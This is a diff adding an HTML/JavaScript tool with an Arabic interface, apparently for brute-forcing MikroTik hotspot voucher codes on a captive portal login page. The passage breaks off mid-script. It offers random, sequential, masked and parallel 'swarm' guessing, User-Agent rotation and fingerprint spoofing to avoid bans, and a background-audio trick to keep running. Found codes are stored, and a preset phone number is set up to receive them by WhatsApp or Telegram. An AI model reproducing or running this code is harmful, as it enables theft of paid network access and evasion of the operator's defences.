@@ -1,0 +1,1571 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>V21 Ultimate Beast - Pro Edition</title>
+    <style>
+        :root { 
+            --primary: #38bdf8; --bg: #020617; --card-bg: #0f172a; 
+            --success: #10b981; --danger: #ef4444; --warning: #f59e0b;
+            --accent: #6366f1; --text: #e2e8f0; --border: #334155;
+        }
+
+        body { 
+            font-family: 'Segoe UI', Tahoma, sans-serif; background-color: var(--bg); color: var(--text); 
+            margin: 0; padding: 10px; display: flex; flex-direction: column; height: 100vh; overflow-x: hidden;
+            transition: box-shadow 0.5s ease, background-color 0.5s ease;
+        }
+
+        /* الوضع الأسود الحقيقي AMOLED */
+        body.amoled-mode {
+            background-color: #000000 !important;
+            --bg: #000000 !important;
+            --card-bg: #050505 !important;
+        }
+
+        /* تأثير التوهج الليلي المتطور (Neon Mode) */
+        body.neon-mode {
+            background-color: #012a1c !important;
+            box-shadow: inset 0 0 100px rgba(16, 185, 129, 0.8), 0 0 50px rgba(16, 185, 129, 0.5) !important;
+        }
+        .neon-glow {
+            border-color: var(--success) !important;
+            box-shadow: 0 0 25px var(--success), inset 0 0 10px var(--success) !important;
+        }
+
+        /* حاوية الأقسام الزجاجية */
+        .glass-panel {
+            background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(10px);
+            border: 1px solid var(--border); border-radius: 15px; padding: 12px; margin-bottom: 8px;
+        }
+
+        /* شاشة الهكر Terminal */
+        .terminal-box {
+            width: 100%; height: 80px; background: #000; color: #10b981; font-family: monospace; 
+            font-size: 0.7rem; border: 1px solid var(--border); border-radius: 8px; padding: 5px; 
+            overflow-y: auto; resize: none; box-sizing: border-box; margin-bottom: 8px;
+        }
+        body.amoled-mode .terminal-box { color: #555; } /* رمادي داكن في وضع الـ AMOLED */
+
+        /* الشاشة المصغرة العائمة (HUD) */
+        #floatingHUD {
+            display: none; position: fixed; top: 10px; right: 10px; z-index: 9999;
+            background: rgba(0,0,0,0.8); border: 1px solid var(--primary); border-radius: 10px; padding: 10px;
+            cursor: pointer; box-shadow: 0 0 15px var(--primary);
+        }
+        
+        #restoreBtn {
+            display: none; position: fixed; bottom: 20px; left: 20px; z-index: 9999;
+            background: var(--accent); color: white; border: none; padding: 15px; border-radius: 50%;
+            font-size: 20px; cursor: pointer; box-shadow: 0 0 20px rgba(99, 102, 241, 0.6);
+        }
+
+        /* لوحة العرض الرئيسية */
+        .hud-main {
+            display: grid; grid-template-columns: 1fr 2fr 1fr; gap: 10px; 
+            background: #000; border: 2px solid var(--primary); border-radius: 12px; padding: 10px; margin-bottom: 8px;
+            transition: all 0.3s ease;
+        }
+        .current-display { text-align: center; border-right: 1px solid var(--border); border-left: 1px solid var(--border); }
+        .current-display h1 { font-family: monospace; font-size: 2.2rem; color: var(--primary); margin: 0; text-shadow: 0 0 10px var(--primary); }
+        .stats-box { display: flex; flex-direction: column; justify-content: center; font-size: 0.75rem; gap: 4px; }
+        .highlight-vault { color: var(--success); font-size: 1.1rem; font-weight: bold; text-shadow: 0 0 5px var(--success); }
+
+        /* الإعدادات والمدخلات */
+        .settings-grid {
+            display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 6px;
+            max-height: 25vh; overflow-y: auto; padding-right: 5px;
+        }
+        .input-group { display: flex; flex-direction: column; gap: 2px; position: relative; }
+        label { font-size: 0.65rem; color: #94a3b8; font-weight: bold; }
+        input, select, textarea { 
+            padding: 6px; border-radius: 6px; border: 1px solid var(--border); 
+            background: #020617; color: var(--primary); outline: none; transition: 0.3s; font-size: 0.75rem;
+        }
+        input[type="checkbox"] { width: 12px; height: 12px; }
+
+        /* Tooltip فقاعة سوداء أنيقة */
+        [title] { position: relative; cursor: help; }
+
+        /* علامات الإدخال السريع */
+        .quick-tags { display: flex; gap: 4px; margin-top: 2px; flex-wrap: wrap; }
+        .quick-tag { 
+            background: #1e293b; color: #38bdf8; padding: 2px 6px; border-radius: 4px; 
+            font-size: 0.6rem; cursor: pointer; border: 1px solid #334155; transition: 0.2s;
+        }
+        .quick-tag:hover { background: var(--primary); color: #000; }
+
+        /* مفاتيح التبديل Toggles */
+        .toggles-bar {
+            display: flex; flex-wrap: wrap; gap: 10px; background: rgba(0,0,0,0.3); padding: 8px; border-radius: 8px; margin-top: 8px;
+        }
+        .toggle-item { display: flex; align-items: center; gap: 4px; font-size: 0.7rem; color: #cbd5e1; cursor: pointer;}
+
+        /* الأزرار */
+        .btn-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(100px, 1fr)); gap: 5px; margin-top: 8px; }
+        button { padding: 8px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; color: white; transition: 0.2s; font-size: 0.7rem; }
+        button:hover { filter: brightness(1.2); }
+        .btn-start { background: var(--success); }
+        .btn-stop { background: var(--danger); }
+        .btn-pause { background: var(--warning); color: #000; }
+        .btn-blue { background: var(--accent); }
+        .btn-gray { background: #475569; }
+        .btn-outline { background: transparent; border: 1px solid var(--primary); color: var(--primary); }
+        .btn-fire { background: linear-gradient(45deg, #ef4444, #f59e0b); color: white; }
+        .btn-ping { background: #8b5cf6; }
+
+        /* جدول السجل */
+        .history-container { flex: 1; background: #000; border: 1px solid var(--border); border-radius: 12px; overflow-y: auto; margin: 8px 0; min-height: 120px; }
+        table { width: 100%; border-collapse: collapse; font-size: 0.7rem; }
+        th { background: #1e293b; color: var(--primary); padding: 6px; position: sticky; top: 0; z-index: 10; }
+        td { padding: 5px; border-bottom: 1px solid #1e293b; text-align: center; }
+        .win-row { background: rgba(16, 185, 129, 0.2) !important; color: var(--success); font-weight: bold; }
+
+        /* منطقة الإطارات (Sessions) */
+        .sessions-view { display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 8px; margin-top: auto; }
+        .session-card { background: #1e293b; border-radius: 8px; height: 110px; position: relative; border: 1px solid var(--border); overflow: hidden; }
+        .session-card iframe { width: 100%; height: 100%; border: none; background: #fff; transform: scale(0.85); transform-origin: top center; pointer-events: none; }
+        .session-info { position: absolute; top: 0; width: 100%; background: rgba(0,0,0,0.85); display: flex; justify-content: space-between; align-items: center; padding: 2px 6px; font-size: 9px; z-index: 5; border-bottom: 1px solid var(--primary); box-sizing: border-box; }
+        .health-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; }
+        .expand-btn { background: var(--accent); color: white; border: none; border-radius: 3px; cursor: pointer; font-size: 8px; padding: 1px 4px; }
+
+        /* النوافذ المنبثقة (Modals) */
+        .modal {
+            display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            background: var(--card-bg); border: 2px solid var(--primary); padding: 20px; border-radius: 15px;
+            z-index: 10001; box-shadow: 0 0 50px rgba(0,0,0,0.8); width: 90%; max-width: 500px; max-height: 90vh; overflow-y: auto;
+        }
+        .modal-overlay { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); z-index:10000; }
+        
+        .hidden { display: none !important; }
+    </style>
+</head>
+<body id="mainBody">
+
+<div class="modal-overlay" id="overlay"></div>
+
+<div id="expandModal" class="modal" style="max-width: 90%; width: 800px; height: 500px; flex-direction: column;">
+    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
+        <h3 style="color: var(--primary); margin: 0;">⛶ العرض المباشر لرد السيرفر (الجلسة <span id="expId"></span>)</h3>
+        <button class="btn-stop" onclick="ui.closeModals()" style="padding: 4px 10px;">إغلاق</button>
+    </div>
+    <iframe id="expandFrame" style="width: 100%; flex: 1; background: #fff; border: none; border-radius: 8px;"></iframe>
+</div>
+
+<div id="winModal" class="modal" style="border-color: var(--success); text-align: center;">
+    <h2 style="color:var(--success)">🎯 تم اكتمال الخزان!</h2>
+    <h1 id="modalCard" style="font-family:monospace; font-size:2rem; color:var(--primary)">--------</h1>
+    <p style="color:#94a3b8">سيبقى الاتصال فعالاً بالكرت الأخير.</p>
+    <div class="btn-grid">
+        <button class="btn-start" onclick="core.sendToApp()" title="يرسل الكروت لتطبيق المراسلة المحدد">إرسال للتطبيق 📤</button>
+        <button class="btn-stop" onclick="ui.closeModals()">إغلاق</button>
+    </div>
+</div>
+
+<div id="vaultModal" class="modal">
+    <h3 style="color:var(--primary); margin-top:0;">📂 إدارة خزان الجلسة الحالية (السعة: <span id="vCap">0</span>)</h3>
+    <textarea id="vaultEditor" style="width:100%; height:100px; margin-bottom:10px; font-family:monospace; resize:none;" title="يحتوي على الكروت الناجحة في الجلسة الحالية فقط"></textarea>
+    
+    <div class="input-group" style="margin-bottom: 10px;">
+        <div style="display: flex; gap: 5px;">
+            <input type="number" id="genCount" placeholder="العدد (مثال: 50)" style="width: 60%;" title="حدد عدد الكروت المطلوب توليدها لتجربتها">
+            <button class="btn-blue" onclick="core.generateToVault()" style="width: 40%;" title="يولد كروت عشوائية ويضعها في المربع">توليد وحفظ ⚡</button>
+        </div>
+    </div>
+
+    <div class="btn-grid">
+        <button class="btn-start" onclick="core.saveVault()" title="حفظ التعديلات اليدوية على الخزان">حفظ التعديلات</button>
+        <button class="btn-blue" onclick="core.useVaultInAttack()" title="يحول وضع البحث إلى ملف ويستخدم هذه الكروت">استخدام في الهجوم</button>
+        <button class="btn-stop" onclick="ui.closeModals()">إغلاق</button>
+    </div>
+</div>
+
+<div id="pastVaultModal" class="modal">
+    <h3 style="color:var(--success); margin-top:0;">📦 خزان الكروت الصحيحة السابقة</h3>
+    <p style="font-size:0.7rem; color:#94a3b8;">إجمالي المحفوظات: <b id="pastVaultCount">0</b></p>
+    <textarea id="pastVaultEditor" style="width:100%; height:120px; margin-bottom:10px; font-family:monospace; resize:none;" title="هنا يتم حفظ جميع الكروت التي نجحت سابقاً حتى بعد مسح السجل"></textarea>
+    <div class="btn-grid">
+        <button class="btn-start" onclick="ui.refreshPastVaultStatus()" title="يجلب الوقت والرصيد المتبقي لجميع الكروت في الخزان عبر Fetch API">تحديث الأرصدة 🔄</button>
+        <button class="btn-blue" onclick="core.savePastVault()" title="يحفظ أي تعديلات أو إضافات يدوية للأنماط هنا">حفظ التعديلات 💾</button>
+        <button class="btn-danger" onclick="core.clearPastVault()" style="background:var(--danger)" title="يحذف جميع الكروت من هذا الخزان نهائياً">حذف الكروت 🗑️</button>
+        <button class="btn-stop" onclick="ui.closeModals()">إغلاق</button>
+    </div>
+</div>
+
+<div id="profilesModal" class="modal">
+    <h3 style="color:var(--primary); margin-top:0;">⚙️ إدارة الحزم والإعدادات الجاهزة</h3>
+    <div class="input-group" style="margin-bottom: 10px;">
+        <input type="text" id="profileName" placeholder="اسم التكوين (مثال: ملف شبكة الشاطئ)" title="اكتب اسماً لحفظ الإعدادات الحالية">
+        <div style="display:flex; gap:5px; margin-top:5px;">
+            <button class="btn-start" style="flex:1;" onclick="core.saveProfile()" title="يحفظ جميع الروابط والأرقام الحالية في المتصفح">حفظ التكوين الحالي</button>
+            <button class="btn-blue" style="flex:1;" onclick="core.loadProfile()" title="يستدعي الإعدادات المحفوظة مسبقاً">استدعاء التكوين</button>
+        </div>
+    </div>
+    <select id="savedProfilesList" style="width:100%;" title="قائمة التكوينات المحفوظة">
+        <option value="">-- اختر ملفاً لاستدعائه أو حذفه --</option>
+    </select>
+    <div class="btn-grid" style="margin-top:10px;">
+        <button class="btn-stop" onclick="core.deleteProfile()" title="يحذف التكوين المحدد من القائمة">حذف التكوين</button>
+        <button class="btn-outline" onclick="ui.closeModals()">إغلاق</button>
+    </div>
+</div>
+
+<div id="floatingHUD" onclick="ui.toggleHUD()" title="انقر للعودة للوضع الكامل">
+    <div style="color:var(--primary); font-size:0.8rem; text-align:center;">
+        <b>V21 HUD</b><br>
+        🎯 <span id="hudVault">0</span> | 🔄 <span id="hudAtt">0</span>
+    </div>
+</div>
+<button id="restoreBtn" onclick="ui.toggleHUD()" title="العودة للواجهة الكاملة">👁️</button>
+
+<div id="mainUI">
+    <textarea id="terminalConsole" class="terminal-box" readonly title="شاشة الهكر: تعرض العمليات الخفية والأخطاء التي لا يراها المستخدم العادي."></textarea>
+    
+    <div class="hud-main" id="hudMainBox">
+        <div class="stats-box">
+            <div title="إجمالي المحاولات في الجلسة الحالية">المحاولات: <b id="statAtt">0</b></div>
+            <div id="fileInfo" class="hidden" title="عدد الكروت المتبقية في وضع الملف">ملف (متبقي): <b id="statFile">0</b></div>
+            <div title="عدد الكروت الناجحة في هذه الجلسة" class="highlight-vault">الخزان الحالي: <b id="statVault">0</b> / <b id="vLimitLabel">3</b></div>
+            <div title="سرعة الاستجابة من السيرفر بالملي ثانية">الوقت: <b id="statLat">0</b> ms</div>
+        </div>
+        <div class="current-display" title="الكرت الذي يتم فحصه حالياً">
+            <label style="font-size:0.6rem; color:#94a3b8;">الكرت الحالي</label>
+            <h1 id="mainCardDisplay">READY</h1>
+        </div>
+        <div class="stats-box" style="align-items: flex-end;">
+            <div id="wakeStatus" style="color:var(--danger)" title="حالة بقاء الشاشة قيد التشغيل">● خمول</div>
+            <div id="statusText" style="color:var(--warning); font-size:0.7rem;" title="حالة النظام الحالية">بانتظار البدء...</div>
+            <div id="idbStatus" style="color:#6366f1; font-size:0.6rem;" title="حالة قاعدة البيانات المحلية IndexedDB">💾 DB: متصل</div>
+        </div>
+    </div>
+
+    <div class="glass-panel">
+        <div class="settings-grid">
+            <div class="input-group">
+                <label>رابط الدخول</label>
+                <input type="text" id="urlLogin" value="http://10.0.0.1/login" title="رابط صفحة تسجيل الدخول لشبكة الميكروتيك">
+                <div class="quick-tags">
+                    <span class="quick-tag" onclick="ui.setUrl('urlLogin', 'http://10.0.0.1/login')">أساسي</span>
+                    <span class="quick-tag" onclick="ui.setUrl('urlLogin', 'http://j.net/login')">احتياطي</span>
+                    <span class="quick-tag" style="background:#10b981;color:#000;" onclick="core.autoDetectURL('login')" title="يبحث عن البوابة تلقائياً">🔍 تعرف تلقائي</span>
+                </div>
+            </div>
+            <div class="input-group">
+                <label>رابط الخروج</label>
+                <input type="text" id="urlLogout" value="http://10.0.0.1/logout?erase-cookie=on" title="رابط تسجيل الخروج لتفريغ الجلسة وتجربة كرت جديد">
+                <div class="quick-tags">
+                    <span class="quick-tag" onclick="ui.setUrl('urlLogout', 'http://10.0.0.1/logout?erase-cookie=on')">أساسي</span>
+                    <span class="quick-tag" onclick="ui.setUrl('urlLogout', 'http://j.net/logout?erase-cookie=on')">احتياطي</span>
+                    <span class="quick-tag" style="background:#10b981;color:#000;" onclick="core.autoDetectURL('logout')">🔍 تعرف تلقائي</span>
+                </div>
+            </div>
+            
+            <div class="input-group">
+                <label>طريقة البحث</label>
+                <select id="attackMode" onchange="ui.toggleFields()" title="الخوارزمية المستخدمة في توليد الكروت وتخمينها">
+                    <option value="random">بحث عشوائي 🎲</option>
+                    <option value="sequential">بحث متتالي 🔢</option>
+                    <option value="mask">قناع (Masking) 🎭</option>
+                    <option value="swarm">هجوم جماعي (Swarm) 🐝</option>
+                    <option value="adaptive">فحص متكيف 🧠</option>
+                    <option value="pattern">فحص بالأنماط السابقة 📊</option>
+                    <option value="file">من ملف 📂</option>
+                    <option value="strict">فحص مؤكد 🛡️</option>
+                </select>
+            </div>
+            <div class="input-group">
+                <label>طريقة الوصول</label>
+                <select id="accessType" title="آلية إرسال الطلبات للسيرفر">
+                    <option value="iframe_direct">إطار مباشر (الأساسي)</option>
+                    <option value="proxy">وكيل عكسي (Proxy)</option>
+                    <option value="fetch">جلب وحقن (Fetch)</option>
+                    <option value="shadow">الذكاء الخارق (Shadow)</option>
+                    <option value="popup">نافذة منبثقة</option>
+                </select>
+            </div>
+
+            <div class="input-group"><label>طول الكرت</label><input type="number" id="cardLen" value="8" title="عدد الخانات الإجمالية للكرت"></div>
+            
+            <div class="input-group">
+                <label>بداية ثابتة (بادئة)</label>
+                <input type="text" id="cardPrefix" value="5" title="الرقم أو الرمز الذي يبدأ به الكرت دائماً">
+                <div class="quick-tags">
+                    <span class="quick-tag" onclick="document.getElementById('cardPrefix').value='1'">1</span>
+                    <span class="quick-tag" onclick="document.getElementById('cardPrefix').value='5'">5</span>
+                    <span class="quick-tag" onclick="document.getElementById('cardPrefix').value='2'">2</span>
+                </div>
+            </div>
+
+            <div class="input-group"><label>الرموز المكونة</label><input type="text" id="charset" value="0123456789" title="الأرقام أو الحروف التي سيتم بناء الكرت منها"></div>
+            
+            <div class="input-group">
+                <label>السرعة (ms)</label>
+                <input type="number" id="speed" value="400" title="سرعة البحث بالملي ثانية. تعتمد عليها الطرق العشوائية والمتتالية. الأساسي هو 400.">
+                <div class="quick-tags">
+                    <span class="quick-tag" onclick="document.getElementById('speed').value=200">200</span>
+                    <span class="quick-tag" onclick="document.getElementById('speed').value=300">300</span>
+                    <span class="quick-tag" onclick="document.getElementById('speed').value=400">400</span>
+                    <span class="quick-tag" onclick="document.getElementById('speed').value=500">500</span>
+                    <span class="quick-tag" onclick="document.getElementById('speed').value=600">600</span>
+                    <span class="quick-tag" onclick="document.getElementById('speed').value=1000">1000</span>
+                </div>
+            </div>
+
+            <div class="input-group">
+                <label>عدد الجلسات الإطارية</label>
+                <input type="number" id="sessionCount" value="1" title="عدد الإطارات (النوافذ) التي تفحص بالتوازي">
+            </div>
+            
+            <div class="input-group">
+                <label>عدد الكروت للتخزين</label>
+                <input type="number" id="vaultLimit" value="3" title="عدد الكروت الصحيحة المطلوب العثور عليها قبل إيقاف البحث">
+            </div>
+
+            <div class="input-group hidden" id="maskGroup"><label>قناع الكرت (*)</label><input type="text" id="cardMask" value="55****22" title="استخدم نجمة * للرقم العشوائي، والأرقام للثوابت"></div>
+            <div class="input-group hidden" id="strictGroup"><label>مرات التأكيد</label><input type="number" id="strictRetries" value="2" title="عدد مرات تكرار فحص نفس الكرت للتأكد"></div>
+            <div class="input-group hidden" id="fileGroup">
+                <label>نطاق الملف (بداية/نهاية)</label>
+                <div style="display:flex; gap:2px;"><input type="number" id="fStart" placeholder="من"><input type="number" id="fEnd" placeholder="إلى"></div>
+                <input type="file" id="fileInput" onchange="core.loadFile(event)" style="font-size:0.5rem; padding:0;" title="ارفع ملف نصوص يحتوي على كروت جاهزة">
+            </div>
+
+            <div class="input-group">
+                <label>التواصل (واتس/تيلي)</label>
+                <div style="display:flex; gap:2px;">
+                    <select id="appType" style="width:40%" title="التطبيق المستخدم للإرسال عند امتلاء الخزان"><option value="none">إيقاف</option><option value="wa">واتس</option><option value="tg">تيلي</option></select>
+                    <input type="text" id="contactNum" value="+967777876284" style="width:60%" title="رقم الهاتف أو المعرف">
+                </div>
+            </div>
+            <div class="input-group">
+                <label>إعادة المحاولة (فشل الشبكة)</label>
+                <div style="display:flex; gap:2px;">
+                    <select id="retryToggle" title="إعادة الفحص تلقائياً إذا فشل الاتصال"><option value="on">تشغيل</option><option value="off" selected>إيقاف</option></select>
+                    <input type="number" id="retryCount" value="2">
+                </div>
+            </div>
+        </div>
+
+        <div class="toggles-bar">
+            <label class="toggle-item" title="تفعيل صوت الرنين عند العثور على كرت"><input type="checkbox" id="tglAlert" checked> تنبيه صوتي</label>
+            <label class="toggle-item" title="يضيف رموز عشوائية للرابط لمنع حفظ المتصفح للصفحة الخاطئة"><input type="checkbox" id="tglCache" checked> تجاوز الكاش</label>
+            <label class="toggle-item" title="يغير نوع المتصفح الوهمي (User-Agent) للتهرب من الحظر"><input type="checkbox" id="tglUA" checked> تدوير الهوية</label>
+            <label class="toggle-item" title="يغير بصمة الإطار لتجنب كشف الجلسات المتعددة"><input type="checkbox" id="tglFinger"> تجاوز البصمة</label>
+            <label class="toggle-item" title="يغير سرعة التأخير بشكل عشوائي للتمويه"><input type="checkbox" id="tglAdapt"> استجابة متغيرة</label>
+            <label class="toggle-item" title="يفحص عدة كروت في نفس الوقت"><input type="checkbox" id="tglParallel"> تخمين متوازي</label>
+            <label class="toggle-item" title="تأثير بصري أخضر عند النجاح"><input type="checkbox" id="tglNeon" checked> توهج النجاح (Neon)</label>
+            <label class="toggle-item" title="يحول الشاشة للون الأسود الحقيقي لتقليل استهلاك البطارية ليلاً"><input type="checkbox" id="tglAmoled" onchange="ui.toggleAmoled()"> وضع AMOLED</label>
+            <label class="toggle-item" title="يُشغل صوت صامت جداً لإيهام المتصفح أنه مشغل وسائط، فيعمل في الخلفية حتى عند قفل الشاشة"><input type="checkbox" id="tglBgAudio" onchange="core.toggleBgAudio()"> صوت الخلفية النشط</label>
+        </div>
+    </div>
+
+    <div class="glass-panel" style="border-color: var(--accent);">
+        <div style="font-size:0.7rem; color:var(--accent); font-weight:bold; margin-bottom:6px;">🛠️ إعدادات متقدمة (Pro Controls Layer)</div>
+        <div class="settings-grid" style="max-height: none;">
+            
+            <div class="input-group">
+                <label>التبريد الإجباري (Cooldown)</label>
+                <div style="display:flex; gap:2px;">
+                    <select id="tglCooldown" title="يوقف العمليات لثوانٍ لتفريغ الذاكرة العشوائية"><option value="on">تشغيل</option><option value="off" selected>إيقاف</option></select>
+                    <input type="number" id="cooldownLimit" value="700" title="توقف بعد X محاولة">
+                </div>
+            </div>
+
+            <div class="input-group">
+                <label>إيقاف عند انقطاع الشبكة</label>
+                <div style="display:flex; gap:2px;">
+                    <select id="tglNetStop" title="يوقف المراقبة كلياً إذا انقطع الواي فاي"><option value="on">تشغيل</option><option value="off" selected>إيقاف</option></select>
+                    <input type="number" id="netStopMins" value="3" title="الوقت بالدقائق">
+                </div>
+            </div>
+
+            <div class="input-group">
+                <label>حذف السجلات التلقائي</label>
+                <div style="display:flex; gap:2px;">
+                    <select id="tglAutoClean" title="يحذف السجلات القديمة من الجدول لمنع بطء الصفحة"><option value="on">تشغيل</option><option value="off" selected>إيقاف</option></select>
+                    <input type="number" id="autoCleanLimit" value="700" title="الحد الأقصى للسجلات المرئية">
+                </div>
+            </div>
+
+            <div class="input-group">
+                <label>توقف مجدول (الساعة)</label>
+                <input type="time" id="stopTimeInput" title="حدد وقتاً ليتم إيقاف المراقبة تلقائياً فيه">
+            </div>
+
+            <div class="input-group">
+                <label>منع تعارض الجلسات</label>
+                <select id="tglIsolation" title="يمنع الإطارات المتعددة من فحص نفس الكرت"><option value="on" selected>مفعل (تلقائي)</option><option value="off">معطل</option></select>
+            </div>
+
+            <div class="input-group" style="justify-content: flex-end;">
+                <button class="btn-fire" onclick="core.deepSessionPurge()" title="يمسح كل البيانات المحلية والكوكيز ويهيئ المتصفح بالكامل">🔥 تطهير عميق (أرض محروقة)</button>
+            </div>
+
+        </div>
+    </div>
+
+    <div class="glass-panel">
+        <div class="btn-grid">
+            <button class="btn-start" onclick="core.start()" title="يبدأ عملية الفحص والهجوم">بدء ⚡</button>
+            <button class="btn-stop" onclick="core.stop()" title="يوقف الفحص نهائياً">إيقاف 🛑</button>
+            <button class="btn-pause" onclick="core.pause()" title="يوقف الفحص مؤقتاً أو يستأنفه">توقف/استئناف ⏸️</button>
+            <button class="btn-ping" onclick="core.pingServer()" title="يفحص استجابة السيرفر قبل البدء ويرجع الوقت بالملي ثانية">فحص الاستجابة 📶</button>
+            <button class="btn-blue" onclick="core.enableLocalFileSave()" title="يطلب صلاحية المتصفح لإنشاء ملف cards.txt وحفظ الكروت تلقائياً داخله (File System Access API)">ربط بملف محلي 💾</button>
+            <button class="btn-outline" onclick="ui.showVault()" title="يعرض الكروت الناجحة في الجلسة الحالية">إدارة الخزان الحالي 📂</button>
+            <button class="btn-outline" onclick="ui.showPastVault()" title="يعرض جميع الكروت الناجحة السابقة ويسمح بفحص أرصدتها">خزان الكروت السابقة 📦</button>
+            <button class="btn-outline" onclick="ui.showProfiles()" title="يحفظ أو يستدعي إعدادات الروابط والسرعة كملفات شخصية">إدارة التكوينات ⚙️</button>
+            <button class="btn-gray" onclick="core.stopAlarm()" title="يوقف الصوت المستمر">كتم الصوت 🔇</button>
+            <button class="btn-outline" onclick="core.clearLogs()" title="ينظف الجدول وينقل الكروت الناجحة الحالية لخزان الكروت السابقة">تنظيف السجل 🗑️</button>
+            <button class="btn-outline" onclick="ui.restoreLogs()" title="يستعيد السجلات التي تم تنظيفها مؤخراً">استعادة السجلات ♻️</button>
+            <button class="btn-outline" onclick="ui.filterWins()" title="يعرض الكروت الناجحة فقط في الجدول">تصفية (نجاح) 🎯</button>
+            <button class="btn-outline" onclick="core.resetFile()" title="يعيد تعيين قراءة الكروت من الملف من البداية">إعادة الملف 🔄</button>
+            <button class="btn-outline" onclick="ui.searchLog()" title="يبحث عن كرت معين داخل السجل المرئي">بحث بالسجل 🔍</button>
+        </div>
+    </div>
+
+    <div class="history-container">
+        <table id="logTable">
+            <thead>
+                <tr><th>الكرت</th><th>جلسة</th><th>الحالة</th><th>الوقت</th><th>تكرار الكرت</th><th>Ping</th></tr>
+            </thead>
+            <tbody id="logBody"></tbody>
+        </table>
+    </div>
+</div>
+
+<div class="sessions-view" id="viewportHost"></div>
+
+<audio id="beep" src="https://actions.google.com/sounds/v1/alarms/beep_short.ogg" preload="auto"></audio>
+<video id="wakeVideo" loop muted playsinline style="display:none; width:1px; height:1px;"></video>
+<audio id="silentAudio" loop playsinline style="display:none;"></audio>
+
+<script>
+// دالة كتابة السجلات في شاشة الهكر Terminal
+function logTerminal(msg) {
+    const term = document.getElementById('terminalConsole');
+    const time = new Date().toLocaleTimeString('ar-YE');
+    term.value += `[${time}] ${msg}\n`;
+    term.scrollTop = term.scrollHeight;
+}
+
+// ==========================================
+// طبقة قاعدة البيانات المتقدمة (IndexedDB Storage)
+// ==========================================
+const dbLayer = {
+    db: null,
+    init: function() {
+        const req = indexedDB.open("V21_Beast_Pro_DB", 2);
+        req.onupgradeneeded = function(e) {
+            const db = e.target.result;
+            if (!db.objectStoreNames.contains("all_tested")) db.createObjectStore("all_tested", { keyPath: "card" });
+            if (!db.objectStoreNames.contains("saved_wins")) db.createObjectStore("saved_wins", { keyPath: "card" });
+            if (!db.objectStoreNames.contains("past_wins")) db.createObjectStore("past_wins", { keyPath: "card" });
+            if (!db.objectStoreNames.contains("active_used")) db.createObjectStore("active_used", { keyPath: "card" });
+            if (!db.objectStoreNames.contains("depleted")) db.createObjectStore("depleted", { keyPath: "card" });
+        };
+        req.onsuccess = (e) => { 
+            this.db = e.target.result; 
+            document.getElementById('idbStatus').innerText = "💾 DB: متصل ومفعل";
+            logTerminal("✅ قاعدة البيانات IndexedDB متصلة وجاهزة لتخزين ملايين الكروت.");
+        };
+        req.onerror = (e) => { 
+            document.getElementById('idbStatus').innerText = "💾 DB: خطأ بالاتصال";
+            document.getElementById('idbStatus').style.color = "var(--danger)";
+            logTerminal("❌ فشل الاتصال بقاعدة البيانات IndexedDB.");
+        };
+    },
+    saveTested: function(card) {
+        if (!this.db) return;
+        try { const tx = this.db.transaction(["all_tested"], "readwrite"); tx.objectStore("all_tested").put({ card: card, time: Date.now() }); } catch(err) {}
+    },
+    saveWin: function(card) {
+        if (!this.db) return;
+        try { const tx = this.db.transaction(["saved_wins", "past_wins"], "readwrite"); 
+              tx.objectStore("saved_wins").put({ card: card, time: new Date().toLocaleString() }); 
+              tx.objectStore("past_wins").put({ card: card, time: new Date().toLocaleString() }); 
+        } catch(err) {}
+    },
+    saveActiveUsed: function(card) {
+        if (!this.db) return;
+        try { const tx = this.db.transaction(["active_used"], "readwrite"); tx.objectStore("active_used").put({ card: card, time: new Date().toLocaleString() }); } catch(err) {}
+    },
+    saveDepleted: function(card) {
+        if (!this.db) return;
+        try { const tx = this.db.transaction(["depleted"], "readwrite"); tx.objectStore("depleted").put({ card: card, time: new Date().toLocaleString() }); } catch(err) {}
+    },
+    getAllPastWins: function(callback) {
+        if (!this.db) { callback([]); return; }
+        try {
+            const tx = this.db.transaction(["past_wins"], "readonly");
+            const store = tx.objectStore("past_wins");
+            const request = store.getAll();
+            request.onsuccess = () => callback(request.result);
+        } catch(err) { callback([]); }
+    },
+    clearStore: function(storeName) {
+        if(!this.db) return;
+        try { const tx = this.db.transaction([storeName], "readwrite"); tx.objectStore(storeName).clear(); } catch(err){}
+    }
+};
+dbLayer.init();
+
+// ==========================================
+// النواة الأساسية + دمج المميزات الجديدة بالكامل
+// ==========================================
+const core = {
+    active: false, paused: false, attempts: 0,
+    vault: [], allTested: [], fileCards: [], originalFile: [], 
+    timers: {}, cardFrequency: {}, isPurging: false, wakeLock: null,
+    usedCardsSession: new Set(),
+    disconnectStartTime: 0,
+    monitorInterval: null,
+    seqCurrent: null,
+    fileHandle: null, // لميزة File System API
+    
+    uas: [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15",
+        "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36"
+    ],
+
+    // فحص الاستجابة (Ping) قبل البدء
+    pingServer: async function() {
+        const u = document.getElementById('urlLogin').value;
+        logTerminal(`[PING] جاري إرسال حزم Ping إلى: ${u}`);
+        const start = Date.now();
+        try {
+            await fetch(u, { mode: 'no-cors', cache: 'no-store' });
+            const ping = Date.now() - start;
+            alert(`✅ استجابة البوابة ممتازة!\nالوقت المستغرق: ${ping}ms`);
+            logTerminal(`[PING] رد السيرفر في ${ping}ms.`);
+            document.getElementById('statLat').innerText = ping;
+        } catch (e) {
+            alert(`⚠️ تعذر الوصول للبوابة. قد تكون غير متصل بالشبكة أو الرابط خاطئ.\nالخطأ: ${e.message}`);
+            logTerminal(`[PING] ❌ فشل الاتصال بالبوابة.`);
+        }
+    },
+
+    // تفعيل File System API
+    enableLocalFileSave: async function() {
+        if (!window.showSaveFilePicker) {
